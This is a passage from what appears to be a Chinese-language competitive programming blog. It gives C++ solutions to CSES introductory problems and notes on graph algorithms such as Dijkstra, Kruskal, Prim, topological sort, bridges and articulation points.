&lt;&lt; '\\n';        else            if(y%2==0) cout &lt;&lt; y*y-(x-1) &lt;&lt; '\\n';            else cout &lt;&lt; (y-1)*(y-1)+(x) &lt;&lt; '\\n';    }    return 0;}\nTwo Knights \nTwo Knights#include&lt;bits/stdc++.h&gt;#define int long long#define eb emplace_back#define pb push_back#define tomax(a, b) ((a)=max(a,b))#define tomin(a, b) ((a)=min(a,b))using namespace std; signed main(){    ios::sync_with_stdio(0);    cin.tie(0), cout.tie(0);    int n;    cin &gt;&gt; n;    cout &lt;&lt; \"0\\n\";    for(int i = 2; i&lt;=n; i++){        cout &lt;&lt; ((i*i)*(i*i-1))/2 - 2*(2*(i-1)*(i-2)) &lt;&lt; '\\n';    }    return 0;}\nTwo Sets \nTwo Sets#include&lt;bits/stdc++.h&gt;#define int long long#define eb emplace_back#define pb push_back#define tomax(a, b) ((a)=max(a,b))#define tomin(a, b) ((a)=min(a,b))#define rep(i, a, b) for(int i = (a); i&lt;=(b); ++i)#define rev(i, a, b) for(int i = (a); i&gt;=(b); --i)using namespace std; signed main(){    ios::sync_with_stdio(0);    cin.tie(0), cout.tie(0);    int n;    cin &gt;&gt; n;    if((n*(n+1)/2) % 2) cout &lt;&lt; \"NO\\n\";    else{        cout &lt;&lt; \"YES\\n\";        if(n%4 == 0){            cout &lt;&lt; n/2 &lt;&lt; '\\n';            rep(i, 1, (n/4)) cout &lt;&lt; i &lt;&lt; ' ' &lt;&lt; n+1-i &lt;&lt; ' ';            cout &lt;&lt; '\\n' &lt;&lt; n/2 &lt;&lt; '\\n';            rep(i, (n/4)+1, n/2) cout &lt;&lt; i &lt;&lt; ' ' &lt;&lt; n+1-i &lt;&lt; ' ';        }else{            cout &lt;&lt; n/2 + 1 &lt;&lt; '\\n';            rep(i, 1, n/2) cout &lt;&lt; i++ &lt;&lt; ' ';            rep(i, n/2+1, n-1) cout &lt;&lt; i++ &lt;&lt; ' ';            cout &lt;&lt; '\\n' &lt;&lt; n/2 &lt;&lt; '\\n';            rep(i, 2, n/2-1) cout &lt;&lt; i++ &lt;&lt; ' ';            rep(i, n/2+2, n) cout &lt;&lt; i++ &lt;&lt; ' ';        }    }    return 0;}\nBit Strings \nBit Strings#include&lt;bits/stdc++.h&gt;#define int long long#define eb emplace_back#define pb push_back#define tomax(a, b) ((a)=max(a,b))#define tomin(a, b) ((a)=min(a,b))#define rep(i, a, b) for(int i = (a); i&lt;=(b); ++i)#define rev(i, a, b) for(int i = (a); i&gt;=(b); --i)using namespace std; const int mod = 1E9 + 7; signed main(){    ios::sync_with_stdio(0);    cin.tie(0), cout.tie(0);    int n, ans = 1;    cin &gt;&gt; n;    rep(i, 1, n) ans = (ans&lt;&lt;1) % mod;    cout &lt;&lt; ans % mod &lt;&lt; '\\n';    return 0;}\nTrailing Zeros \nTrailing Zeros#include&lt;bits/stdc++.h&gt;#define int long long#define eb emplace_back#define pb push_back#define tomax(a, b) ((a)=max(a,b))#define tomin(a, b) ((a)=min(a,b))#define rep(i, a, b) for(int i = (a); i&lt;=(b); ++i)#define rev(i, a, b) for(int i = (a); i&gt;=(b); --i)using namespace std; const int mod = 1E9 + 7; signed main(){    ios::sync_with_stdio(0);    cin.tie(0), cout.tie(0);    int n, ans=0;    cin &gt;&gt; n;    for(int i = 5; i&lt;=n; i*=5){        ans += n/i;    }    cout &lt;&lt; ans &lt;&lt; '\\n';    return 0;}\nCoin Piles \nCoin Piles#include &lt;bits/stdc++.h&gt;#define ios ios_base::sync_with_stdio(0), cin.tie(0), cout.tie(0);#define pii pair&lt;int, int&gt;#define int long long#define rep(i, a, b) for(int i = a; i&lt;=b; i++ )#define rev(i, a, b) for(int i = a; i&gt;=b; i-- )#define tomax(a, b) (a)=max((a), (b))#define tomin(a, b) (a)=min((a), (b))#define pb push_back#define eb emplace_backusing namespace std; signed main(){    ios    int t;    cin &gt;&gt; t;    while(t--){        int a, b;        cin &gt;&gt; a &gt;&gt;b;        if(2*a-b&gt;=0 &amp;&amp; 2*b-a&gt;=0 &amp;&amp; (2*a-b)%3==0 &amp;&amp; (2*b-a)%3==0)            cout &lt;&lt; \"YES\\n\";        else            cout &lt;&lt; \"NO\\n\";    }    return 0;}\nPalindrome Reorder \nPalindrome Reorder#include &lt;bits/stdc++.h&gt;#define ios ios_base::sync_with_stdio(0), cin.tie(0), cout.tie(0);#define pii pair&lt;int, int&gt;#define int long long#define rep(i, a, b) for(int i = a; i&lt;=b; i++ )#define rev(i, a, b) for(int i = a; i&gt;=b; i-- )#define tomax(a, b) (a)=max((a), (b))#define tomin(a, b) (a)=min((a), (b))#define pb push_back#define eb emplace_backusing namespace std; signed main(){    ios    string s;    char res[1000006];    int ch[30], odd=0;    fill(ch, ch+27, 0);    cin &gt;&gt; s;    for(int i = 0; s[i]; i++)        ch[s[i]-'A']++;    for(int i = 0; i&lt;26; i++)        odd+=ch[i]%2;    if(odd&gt;0 &amp;&amp; s.size()%2==0){cout &lt;&lt; \"NO SOLUTION\\n\"; return 0;}    if(odd!=1 &amp;&amp; s.size()%2){cout &lt;&lt; \"NO SOLUTION\\n\"; return 0;}    int idx = 0, n=s.size()-1;    rep(i, 0, 25){        if(ch[i]%2) ch[i]--, res[n/2]='A'+i;        rev(j, ch[i], 1)            res[idx]=res[n-idx]='A'+i, idx++, j--;    }rep(i, 0, n) cout &lt;&lt; res[i];    cout &lt;&lt; '\\n';    return 0;}\nGray Code \n這題我有寫題解，這邊\n Gray Code#include &lt;bits/stdc++.h&gt;#define ios ios_base::sync_with_stdio(0), cin.tie(0), cout.tie(0);#define pii pair&lt;int, int&gt;#define int long long#define rep(i, a, b) for(int i = a; i&lt;=b; i++ )#define rev(i, a, b) for(int i = a; i&gt;=b; i-- )#define tomax(a, b) (a)=max((a), (b))#define tomin(a, b) (a)=min((a), (b))#define pb push_back#define eb emplace_backusing namespace std; signed main(){    ios    int n;    cin &gt;&gt; n;    rep(i, 0, (1&lt;&lt;n)-1){        cout &lt;&lt; (i&gt;&gt;(n-1));        rev(j, n-2, 0)            cout &lt;&lt; (((i&gt;&gt;j)&amp;1) ^ ((i&gt;&gt;(j+1))&amp;1));        cout &lt;&lt; '\\n';    }    return 0;}\nTower of Hanoi \nTower of Hanoi#include &lt;bits/stdc++.h&gt;#define int long long #define pii pair&lt;int, int&gt;#define F first #define S second#define rep(i, a, b) for(int i = a; i&lt;=b; i++)#define rev(i, a, b) for(int i = a; i&gt;=b; i--)#define tomax(a,b) (a)=max((a), (b))#define tomin(a,b) (a)=min((a), (b))#define pb push_back#define eb emplace_back#define ios ios_base::sync_with_stdio(0), cin.tie(0), cout.tie(0)using namespace std; vector&lt;pii&gt; ans; void move(int num, int from, int to){    int use = 6-from-to;    if(num == 1) ans.eb(from,to);    else move(num-1,from,use), move(1,from,to), move(num-1,use,to);} signed main(){    ios;    int n;    cin &gt;&gt; n;    move(n, 1, 3);    cout &lt;&lt; ans.size() &lt;&lt; '\\n';    for(pii i : ans)        cout &lt;&lt; i.F &lt;&lt; ' ' &lt;&lt; i.S &lt;&lt; '\\n';    return 0;}\nCreating Strings \nCreating Strings#include &lt;bits/stdc++.h&gt;#define int long long #define pii pair&lt;int, int&gt;#define F first #define S second#define rep(i, a, b) for(int i = a; i&lt;=b; i++)#define rev(i, a, b) for(int i = a; i&gt;=b; i--)#define tomax(a,b) (a)=max((a), (b))#define tomin(a,b) (a)=min((a), (b))#define pb push_back#define eb emplace_back#define ios ios_base::sync_with_stdio(0), cin.tie(0), cout.tie(0)using namespace std; set&lt;string&gt; ans;string s;int len; void select(int pos, string cur, bool used[10]){    if(pos == len) {ans.insert(cur); return;}    rep(i, 0, len-1){        if(!used[i])            used[i]=1, select(pos+1, cur+s[i], used),used[i] = 0;;    }} signed main(){    ios;    cin &gt;&gt; s;    len = s.size();    string tmp; bool tmp2[10];    memset(tmp2, 0, sizeof(tmp2));    select(0,tmp,tmp2);    cout &lt;&lt; ans.size() &lt;&lt; '\\n';    for(string i : ans)        cout &lt;&lt; i &lt;&lt; '\\n';    return 0;}\nApple Division \nApple Division#include &lt;bits/stdc++.h&gt;#define int long long #define pii pair&lt;int, int&gt;#define F first #define S second#define rep(i, a, b) for(int i = a; i&lt;=b; i++)#define rev(i, a, b) for(int i = a; i&gt;=b; i--)#define tomax(a,b) (a)=max((a), (b))#define tomin(a,b) (a)=min((a), (b))#define pb push_back#define eb emplace_back#define ios ios_base::sync_with_stdio(0), cin.tie(0), cout.tie(0)using namespace std; signed main(){    ios;    int n, app[21];    cin &gt;&gt; n;    rep(i, 0, n-1) cin &gt;&gt; app[i];    int ans = 1e11;    rep(i, 0, (1&lt;&lt;n)-1){        int a=0, b=0;        rep(j, 0, n-1)            a+=app[j]*((i&gt;&gt;j)&amp;1), b+=app[j]*(((i&gt;&gt;j)&amp;1)^1);        tomin(ans, abs(a-b));    }cout &lt;&lt; ans &lt;&lt; '\\n';    return 0;}\nChessboard and Queens \nChessboard and Queens#include &lt;bits/stdc++.h&gt;#define int long long#define pii pair&lt;int, int&gt;#define F first#define S second#define rep(i, a, b) for(int i = a; i&lt;=b; i++)#define rev(i, a, b) for(int i = a, i&gt;=b; i--)#define tomax(a, b) (a)=max((a),(b))#define tomin(a,b) (a)-min((a),(b))#define pb push_back#define eb emplace_back#define ios ios_base::sync_with_stdio(0), cin.tie(0), cout.tie(0)using namespace std; bool go[10][10];int ans = 0; bool check(int board[10]){    bool ok = true;    rep(i, 1, 8){        if(!go[i][board[i]]) ok = false;        rep(j, 1, 8)            if(i!=j)                ok = (ok &amp;&amp; (board[j]!=board[i]+(j-i)) &amp;&amp; (board[j]!=board[i]-(j-i)));    }    return ok;} void test(int pos, int board[10], bool dont[10]){    if(pos == 9){ans+=check(board); return;}    rep(i, 1, 8)        if(!dont[i])            board[pos]=i, dont[i]=1, test(pos+1, board, dont), dont[i]=0;} signed main(){    ios;    char cmd;    rep(i,1,8)        rep(j, 1, 8)            cin &gt;&gt; cmd, go[j][i]=(cmd=='.');    int blank[10]; bool blank2[10];    memset(blank2, 0, sizeof(blank2));    test(1, blank, blank2);    cout &lt;&lt; ans &lt;&lt; '\\n';    return 0;}\nDigit Queries \nDigit Queries#include &lt;bits/stdc++.h&gt;#define int long long#define pii pair&lt;int, int&gt;#define F first#define S second#define rep(i, a, b) for(int i = a; i&lt;=b; i++)#define rev(i, a, b) for(int i = a, i&gt;=b; i--)#define tomax(a, b) (a)=max((a),(b))#define tomin(a,b) (a)-min((a),(b))#define pb push_back#define eb emplace_back#define ios ios_base::sync_with_stdio(0), cin.tie(0), cout.tie(0)#define take(num, pos) ((pos==1) ? (num%10) : (num%pow[pos+1])/pow[pos])using namespace std; signed main(){    ios;    int q, u[20], pow[20];    u[0]=0;    for(int i = 1, add=1; i&lt;=1e18; add++, i*=10)        u[add] = u[add-1]+(i*10-i)*add, pow[add]=i;    cin &gt;&gt; q;    while(q--){        int cmd;        cin &gt;&gt; cmd;        int pos = 0;        while(cmd&gt;u[pos]) pos++;        int num = cmd&lt;10 ? cmd : ((cmd-u[pos-1]-1)/(pos) + pow[pos]);        // cout &lt;&lt; num &lt;&lt; ' ' &lt;&lt; pos &lt;&lt; ' ' &lt;&lt; u[pos-1] &lt;&lt; ' ' &lt;&lt; (pos-((cmd-u[pos-1]-1)%pos)) &lt;&lt; '\\n';        cout &lt;&lt; (cmd&lt;10? cmd : (take(num, pos-((cmd-u[pos-1]-1)%pos))) ) &lt;&lt; '\\n';    }    return 0;}\nGrid Paths \n唯一一題卡住跑去看別人題解的，因為直接暴力一定爆，發現有神奇判別不可能的方法，幫上下都走過左右沒走過，左右都走過上下沒走過就一定不可能，否則就有可能繞完整張圖，這樣就只會有 88418 次，超酷的。\nGrid Paths#include &lt;bits/stdc++.h&gt;#define int long long#define pii pair&lt;int, int&gt;#define F first#define S second#define rep(i, a, b) for(int i = a; i&lt;=b; i++)#define rev(i, a, b) for(int i = a, i&gt;=b; i--)#define tomax(a, b) (a)=max((a),(b))#define tomin(a,b) (a)-min((a),(b))#define pb push_back#define eb emplace_back#define ios ios_base::sync_with_stdio(0), cin.tie(0), cout.tie(0)using namespace std; int ans = 0, board[10][10];string s;bool vis[10][10]; void dfs(int go, int x, int y){    if(vis[x][y]) return;    if(x==1 &amp;&amp; y==7){ ans+=(go==48); return; }    if(vis[x][y+1] &amp;&amp; vis[x][y-1] &amp;&amp; !vis[x-1][y] &amp;&amp; !vis[x+1][y]) return;    if(!vis[x][y+1] &amp;&amp; !vis[x][y-1] &amp;&amp; vis[x-1][y] &amp;&amp; vis[x+1][y]) return;    vis[x][y]=1;    if(s[go]=='D' || s[go]=='?') dfs(go+1, x, y+1);    if(s[go]=='U' || s[go]=='?') dfs(go+1, x, y-1);    if(s[go]=='L' || s[go]=='?') dfs(go+1, x-1, y);    if(s[go]=='R' || s[go]=='?') dfs(go+1, x+1, y);    vis[x][y]=0;} signed main(){    ios;    cin &gt;&gt; s;    memset(vis, 0, sizeof(vis));    rep(i, 0, 8)        vis[i][0]=vis[i][8]=vis[0][i]=vis[8][i]=1;    dfs(0, 1, 1);    cout &lt;&lt; ans &lt;&lt; '\\n';    return 0;}\n結語 \n其實寫 Introductory Problem 蠻爽的，幾乎一次就 AC，用來刷成就感的😏\n","categories":["程式題解","CSES"],"tags":["CSES"]},{"title":"圖論（c++）","url":"/graph/","content":"前言 \n一些圖論演算法。\n\n拓樸排序 \n拓樸排序const int N = 1E5 + 5;vector&lt;int&gt; edge[N];void Topological_sort(int V){    vector&lt;int&gt; res;    int enter_deg[N];    memset(enter_deg, 0, sizeof(enter_deg));    for(int i = 0; i &lt; V; i++)        for(int cur : edge[i])            enter_deg[cur]++;    priority_queue&lt;int, vector&lt;int&gt;, greater&lt;int&gt;&gt; q;    for(int i = 0; i&lt;V; i++)        if(enter_deg[i]==0)            q.push(i);    while(!q.empty()){        int cur = q.top(); q.pop();        res.eb(cur);        for(int ch : edge[cur]){            if(--enter_deg[ch] == 0)                q.push(ch);        }    }    bool is_dag=true;    for(int i = 0; i&lt;V; i++)        if(enter_deg[i]!=0)            is_dag=false;}\n最小生成🌲 \nzerojudge\na129\nKruskal’s Algorithm \n精神：Disjoint Set 找不形成環的最小邊\nKruskal's Algorithm O(N log N)#include &lt;bits/stdc++.h&gt;#define N 200005#define edge pair&lt;int, pair&lt;int, int&gt; &gt;#define u first#define v second.first#define w second.second#define int long longusing namespace std;int boss[N], n, m;edge E[N];bool cmp(edge a, edge b){    return a.w &lt; b.w;}int find_boss(int x){    if(x == boss[x])    return x;    return boss[x] = find_boss(boss[x]);  //路徑壓縮}signed main(){    ios::sync_with_stdio(0);    cin.tie(0);    while(cin &gt;&gt; n &gt;&gt; m){        int num_edge = 0;        for(int i = 0; i&lt;n; i++) boss[i] = i;        for(int i = 0; i&lt;m; i++) cin &gt;&gt; E[i].u &gt;&gt; E[i].v &gt;&gt; E[i].w;        sort(E, E+m, cmp);        int ans = 0;                   for(int i = 0; i&lt;m; i++){            int a = find_boss(E[i].u), b = find_boss(E[i].v);            if(a!=b){                boss[b] = a;                ans += E[i].w;                num_edge++;            }        }        if(num_edge == n-1)            cout &lt;&lt; ans &lt;&lt; '\\n';        else cout &lt;&lt; \"-1\\n\";    }        return 0;}\nPrim’s Algorithm \n精神：找不在樹上，距離樹各點最近的點\nPrim's Algorithm (跟最短路徑的 Dijkstra 很像) O (N log N)#include &lt;bits/stdc++.h&gt;#define N 200005#define pii pair&lt;int, int&gt;#define w first#define to second#define int long longusing namespace std;signed main(){    ios::sync_with_stdio(0);    cin.tie(0);    int n, m;    while(cin &gt;&gt; n &gt;&gt; m){        vector&lt;pii&gt; E[N];        int num_edge = 0, ans = 0;        for(int i = 0, u, v, w; i&lt;m; i++)            cin &gt;&gt; u &gt;&gt; v &gt;&gt; w, E[u].push_back({w,v}), E[v].push_back({w, u});        priority_queue&lt;pii, vector&lt;pii&gt;, greater&lt;pii&gt;&gt; q;        bool vis[N]; memset(vis, 0, sizeof(vis)); vis[0] = 1;        for(pii x : E[0]) q.push(x);        while(!q.empty()){            pii cur = q.top(); q.pop();             if(vis[cur.to]) continue;            vis[cur.to] = 1, num_edge++;            ans += cur.w;            for(pii x : E[cur.to]) q.push(x);        }        if(num_edge == n-1)            cout &lt;&lt; ans &lt;&lt; '\\n';        else cout &lt;&lt; \"-1\\n\";    }        return 0;}\n最短路徑 \nzerojudge\na874\nFloyd-Warshall \n精神： Dynamic Programming\nFloyd-Warshall O (N^3) 全對全// dis[i][j]: 初始化為i-&gt;j這條邊的權重// 若沒被定義的就設定為INFfor(int k=1; k&lt;=n; k++)    for(int i=1; i&lt;=n; i++)        for(int j=1; j&lt;=n; j++)            dis[i][j]=min(dis[i][j], dis[i][k]+dis[k][j]);\nDijkstra \n精神： Greedy 找不在樹上，距離樹根最短的點\nDijkstra O (N log N) 單對全#include &lt;bits/stdc++.h&gt;#define pii pair&lt;int, int&gt;#define w first#define to secondusing namespace std;const int INF = 1E9;signed main(){    ios::sync_with_stdio(0);    cin.tie(0);    int n;    while(cin &gt;&gt; n){        vector&lt;pii&gt; E[30];        char s, e;        int dis[30];        fill(dis, dis+30, INF);        bool vis[30] = {0};        char  x, y;        for(int i =0, w; i&lt; n; i++)            cin&gt;&gt;x&gt;&gt;y&gt;&gt;w, x-=(int)'A', y-=(int)'A', E[x].push_back({w,y}), E[y].push_back({w,x});        cin &gt;&gt; s &gt;&gt; e, s-='A', e-='A', dis[s] = 0;        priority_queue&lt;pii, vector&lt;pii&gt;, greater&lt;pii&gt;&gt; pq;        dis[s] = 0, pq.push({0,s});        while(!pq.empty()){            pii cur = pq.top(); pq.pop();            if(vis[cur.to]) continue;            vis[cur.to] = 1;            for(pii go : E[cur.to]){                if(dis[go.to] &gt; dis[cur.to]+go.w){                    dis[go.to] = dis[cur.to]+go.w;                    pq.push({dis[go.to], go.to});                }            }        }        if(dis[e]==INF) cout &lt;&lt; \"NoRoute\\n\";        else cout &lt;&lt; dis[e] &lt;&lt; '\\n';    }}\n雙連通分量、橋、割點 \n寫點題目 \nneoj165 \n#include&lt;bits/stdc++.h&gt;using namespace std;//確認是一個有相無環圖 拓樸排序int main(){    ios::sync_with_stdio(0);    cin.tie(0);    int t;    cin &gt;&gt; t;    while(t--){        int deg[100006];        vector&lt;int&gt; arr[100006];        priority_queue&lt;int, vector&lt;int&gt;, greater&lt;int&gt; &gt; Q;        queue&lt;int&gt; ans;        memset(deg, 0, sizeof(deg));        int n, m;        cin &gt;&gt; n &gt;&gt; m;        //由兩個整數  a  和  b  ( 0 ≤ a , b ≤ n − 1 )組成，        //代表要攻破陣地  b  之前必須先攻破陣地  a ，其中陣地從 0 ~ n − 1 依序編號。        for(int i = 0, a, b; i&lt;m; i++)            cin&gt;&gt;a&gt;&gt;b, arr[a].push_back(b), deg[b]++;        for(int i = 0; i&lt;n; i++)            if(deg[i]==0)                Q.push(i);        while(!Q.empty()){            int tmp = Q.top();            Q.pop(); ans.push(tmp);            for(int i : arr[tmp]){                if(--deg[i]==0)                    Q.push(i);            }        }        bool QAQ = false;        for(int i = 0; i&lt;n; i++)            if(deg[i]) {QAQ=true; break;}        if(QAQ) cout &lt;&lt; \"QAQ\";        else    while(!ans.empty()){            cout &lt;&lt; ans.front(), ans.pop();            if(ans.size()&gt;=1)                cout &lt;&lt; ' ';        }        cout &lt;&lt; '\\n';    }}\nneoj391 \n#include&lt;bits/stdc++.h&gt;#define N 101#define pii pair&lt;int, int&gt;#define w first#define p second#define int long longusing namespace std;signed main(){    ios::sync_with_stdio(0);    cin.tie(0);    int t;    cin &gt;&gt; t;    while(t--){        // N代表可魚國內有幾個城市， M代表墨魚運輸公司提供幾種運輸方案        // S , E 分別代表你的工廠所在的城市以及你所要送去的城市。         // F 代表那隻富有的大可魚訂購了多少箱的可魚果。        int n,m,s,e,f;        vector&lt;pii&gt; P[N];        cin&gt;&gt;n&gt;&gt;m&gt;&gt;s&gt;&gt;e&gt;&gt;f;        //一定是全部一起送去最便宜        //邊權即送f過去的價錢        for(int i = 0; i&lt;m; i++){            int a, b, c, d , cc, w;            //每個方案  P i  會從一個固定的起始城市  A i  運送東西到另一個固定的終點城市  B i             //，每運輸一箱的可魚果，你就必須付給墨魚運輸公司  C i  可魚幣。另外，            //若兩個方案的終點與起點相接，則可以不花任何額外費用的將貨物轉過去。不過由於你的運輸量太大了，            //墨魚運輸公司決定祭出優惠，若用方案  P i  運輸了超過  D i  箱的可魚果，            //多出來的部份每箱改收優惠價  C i ′  可魚幣。            cin &gt;&gt; a &gt;&gt;b &gt;&gt;c &gt;&gt; d &gt;&gt;cc;            if(f&lt;=d)    w = c*f;            else        w = c*d+(f-d)*cc;            P[a].push_back(make_pair(w, b));        }        priority_queue&lt;pii,vector&lt;pii&gt;,greater&lt;pii&gt; &gt; Q;//排序要看全中 所以w要在前面        Q.push(make_pair(0, s));        bool vis[N];        int d[N];        for(int i = 0; i&lt;N; i++)  d[i] = 1e18;        d[s] = 0;        memset(vis, 0, sizeof(vis));        while(!Q.empty()){            int pt = Q.top().p;            Q.pop();            if(!vis[pt]){                for(pii i: P[pt]){                    int nP = i.p, nW = i.w;                    if(d[pt]+nW &lt; d[nP]){                        d[nP] = d[pt]+nW;                        Q.push(make_pair(d[nP],nP));                    }                }                vis[pt] = true;            }        }        cout&lt;&lt;d[e]&lt;&lt;endl;    }    return 0;}\nneoj431 \n#include &lt;bits/stdc++.h&gt;#define MAX 500005#define INF 1e18#define int long long#define pii pair&lt;int, int&gt;#define weight first#define val secondtypedef long long LL;using namespace std;//城市、軌道、改的數量int n,m,q;vector&lt; pii &gt; ahead[MAX];vector&lt; pii &gt; back[MAX];int ahead_dis[MAX], back_dis[MAX];/*先建一條1-&gt;n的最短路在把箭頭反過來建一條n-&gt;1的新建的路是a-&gt;b最後球1-&gt;n 跟 1-&gt;a + a-&gt;b + b-&gt;n 誰比較小誰就是答案*/signed main(){    ios::sync_with_stdio(0);    cin.tie(0);    memset(ahead_dis, 0, sizeof(ahead_dis));    memset(back_dis, 0, sizeof(back_dis));    cin &gt;&gt; n &gt;&gt; m &gt;&gt;q;    for(int i = 0; i&lt;m; i++){        int a,b,w;        cin &gt;&gt; a &gt;&gt; b &gt;&gt; w;        ahead[a].push_back(make_pair(w,b));        back[b].push_back(make_pair(w,a));    }    for(int i = 0 ;i&lt;MAX;i++){        ahead_dis[i] = INF, back_dis[i] = INF;    }    ahead_dis[1] = 0, back_dis[n] = 0;    bool visA[MAX], visB[MAX];    memset(visA, 0, sizeof(visA));    memset(visB, 0, sizeof(visB));    priority_queue&lt;pii, vector&lt;pii&gt;, greater&lt;pii&gt; &gt; QA;    priority_queue&lt;pii, vector&lt;pii&gt;, greater&lt;pii&gt; &gt; QB;    QA.push( make_pair(0,1));    QB.push( make_pair(0,n));    while(!QA.empty()){        int cur  = QA.top().val;        QA.pop();        if(!visA[cur]){            for(pii i : ahead[cur]){                int v = i.val, w= i.weight;                if(ahead_dis[cur]+w &lt; ahead_dis[v]){                    ahead_dis[v] = ahead_dis[cur]+w;                    QA.push(make_pair(ahead_dis[v],v));                }            }            visA[cur] = true;        }    }    while(!QB.empty()){        int cur  = QB.top().val;        QB.pop();        if(!visB[cur]){            for(pii i : back[cur]){                int v = i.val, w= i.weight;                if(back_dis[cur]+w &lt; back_dis[v]){                    back_dis[v] = back_dis[cur]+w;                    QB.push(make_pair(back_dis[v],v));                }            }            visB[cur] = true;        }    }    while(q--){        int a, b;        cin &gt;&gt; a &gt;&gt; b;        int ori = ahead_dis[n];        int aft = ahead_dis[a]+1+back_dis[b];        cout &lt;&lt; min(ori, aft) &lt;&lt; '\\n';    }    return 0;}\nneoj394 \nneoj375 \nneoj736 \nneoj179 \n#include &lt;bits/stdc++.h&gt;#define Max 30005#define pt first#define cnt second#define init(x) memset(x, 0, sizeof(x))typedef long long LL;using namespace std;int n,m;vector&lt;int&gt; edges[Max];bool vis[Max], isAP[Max];vector&lt;pair&lt;int, int&gt; &gt; AP;int maxAP_child = 0, maxAP = Max;int low[Max], lv[Max], CHcnt[Max];int chcnt = 0;void dfs(int root, int lev, int father){    lv[root] = lev;    vis[root] = true;    low[root] = lev;    int inChCnt = chcnt, wwwwwCnt = 0, son_cnt = 0;    bool isAP = false;    for(int ch : edges[root]){        if(ch==father || ch==root) continue;        if(vis[ch]) low[root] = min(low[root], lv[ch]);        else{            son_cnt++;            dfs(ch, lev+1, root);            low[root] = min(low[root], low[ch]);            chcnt++;            if(low[ch]&gt;=lv[root] &amp;&amp; lv[root]!=0) isAP=true, wwwwwCnt+=CHcnt[ch];        }    }    CHcnt[root] = chcnt-inChCnt+1;    // if(lv[root]==0 &amp;&amp; son_cnt&gt;1) isAP=true;    if(isAP) AP.push_back(make_pair(root, wwwwwCnt));    // cout &lt;&lt; root &lt;&lt; ' ' &lt;&lt; CHcnt[root] &lt;&lt; ' ' &lt;&lt; low[root] &lt;&lt; ' ' &lt;&lt; lv[root]&lt;&lt;' '&lt;&lt;wwwwwCnt&lt;&lt; '\\n';}//因為有🈹️點傳的人就會減少，所以如果沒有割點那就是傳0//會變少的點就只有割點，透過記錄每個包含自己的樹的節點數，在遇到low[ch]&gt;=lv[root]時把ch整棵樹加進去，//最後就能得到可減少結點數，維護最大可減少節點數跟最小的最大可減少節點數的節點，最後就輸出這兩個int main(){    ios::sync_with_stdio(0);    cin.tie(0);    init(vis), init(low), init(isAP), init(lv), init(CHcnt);    cin &gt;&gt; n &gt;&gt; m;    for(int i = 0, x, y; i&lt;m; i++)        cin &gt;&gt; x &gt;&gt; y, edges[x].push_back(y), edges[y].push_back(x);    int p;    cin &gt;&gt; p;    dfs(p, 0, -1);    for(auto ap : AP){        if(ap.cnt == maxAP_child) maxAP = min(maxAP,ap.pt);        if(ap.cnt &gt; maxAP_child) maxAP = ap.pt;        maxAP_child = max(maxAP_child,ap.cnt);    }    if(maxAP_child == 0) cout &lt;&lt;\"0\\n\";    else cout &lt;&lt;maxAP&lt;&lt;' '&lt;&lt; CHcnt[p]-maxAP_child &lt;&lt; '\\n';    return 0;}\nneoj183 \n#include &lt;bits/stdc++.h&gt;#define Max 1000006#define init(x) memset(x, 0, sizeof(0))typedef long long LL;using namespace std;int n,m;vector&lt;int&gt; E[Max];int lv[Max], low[Max];bool vis[Max], AP[Max];void dfs(int root, int lev, int father){    if(vis[root]) return;    vis[root]=true;    low[root] = lv[root] = lev;    int son_cnt = 0;    for(int ch : E[root]){        if(ch==father) continue;        if(vis[ch]) low[root] = min(low[root], lv[ch]);        else{            // cout &lt;&lt; root &lt;&lt; ' ' &lt;&lt; ch &lt;&lt; '\\n';            son_cnt++;            dfs(ch, lev+1, root);            low[root] = min(low[root], low[ch]);            if(low[ch]&gt;=lv[root] &amp;&amp; lv[root]!=0)   AP[root]=1;        }    }    if(lv[root] == 0 &amp;&amp; son_cnt&gt;1)        AP[root] = 1;    // cout &lt;&lt; root &lt;&lt; ' ' &lt;&lt; low[root] &lt;&lt; ' ' &lt;&lt; lv[root] &lt;&lt; ' ' &lt;&lt; AP[root] &lt;&lt; ' ' &lt;&lt; son_cnt&lt;&lt; '\\n';}int main(){    ios::sync_with_stdio(0);    cin.tie(0);    init(vis), init(low), init(lv), init(AP);    cin &gt;&gt; n &gt;&gt; m;    for(int i = 0, x, y;i&lt;m; i++)        cin&gt;&gt;x&gt;&gt;y, E[x].push_back(y), E[y].push_back(x);    dfs(1,0,-1);    for(int i = 1; i&lt;=n; i++)        if(AP[i])            cout &lt;&lt; i &lt;&lt; '\\n';    return 0;}\nneoj184 \n#include &lt;bits/stdc++.h&gt;#define Max 1000006#define init(x) memset(x, 0, sizeof(x))#define edge(x,y) make_pair(min(x,y), max(x,y))#define pii pair&lt;int, int&gt; typedef long long LL;using namespace std;vector&lt;int&gt; E[Max];int low[Max], lv[Max];bool vis[Max];//x&lt;yset&lt;pii&gt; bridge;vector&lt;pii&gt; input;void dfs(int root, int father){    if(vis[root])   return;    vis[root] = true;    low[root] = lv[root] = lv[father]+1;    for(int ch : E[root]){        if(ch!=father){            dfs(ch, root);            low[root] = min(low[ch],low[root]);            if(low[ch]&gt;lv[root]) //從子孫回來的                bridge.insert(edge(ch,root));        }    }}int main(){    ios::sync_with_stdio(0);    cin.tie(0);    int n, m;    init(low), init(lv), init(vis);    cin &gt;&gt; n &gt;&gt; m;    for(int i = 0,x,y; i&lt;m; i++)        cin&gt;&gt;x&gt;&gt;y, E[x].push_back(y),E[y].push_back(x),input.push_back(edge(x,y));    dfs(1,0);    for(auto ed : input)        if(bridge.count(ed))            cout &lt;&lt; ed.first &lt;&lt; ' ' &lt;&lt; ed.second &lt;&lt; '\\n';    return 0;}\nneoj739 \n\nneoj737 \nneoj738 \n2022 附中校內賽 PD\n\n利用 DSU 倒著加邊回去\n#include &lt;bits/stdc++.h&gt;using namespace std;typedef long long ll;#define pii pair&lt;int,int&gt;#define x first#define y second#define ios ios::sync_with_stdio(0);cin.tie(0);cout.tie(0)#define eb emplace_back#define pb push_back#define popb pop_back#define int llconst int N = 200005;int bose[N];int n, m, q;pii e[N];vector&lt;pii&gt; op;vector&lt;bool&gt; ans;vector&lt;int&gt; G[N];bool no_pt[N];int find_bose(int ch){    if(bose[ch] == ch) return ch;    return bose[ch] = find_bose(bose[ch]);}signed main(){    // ios;    //刪邊 -&gt; 加邊 答案倒著輸出    cin &gt;&gt; n &gt;&gt; m;    for(int i = 0; i&lt;N; i++) bose[i] = i;    for(int i = 0; i&lt;m; i++) cin &gt;&gt; e[i].x &gt;&gt; e[i].y, G[e[i].x].eb(e[i].y), G[e[i].y].eb(e[i].x);    cin &gt;&gt; q;    memset(no_pt, 0, sizeof(no_pt));    for(int i = 0; i&lt;q; i++){        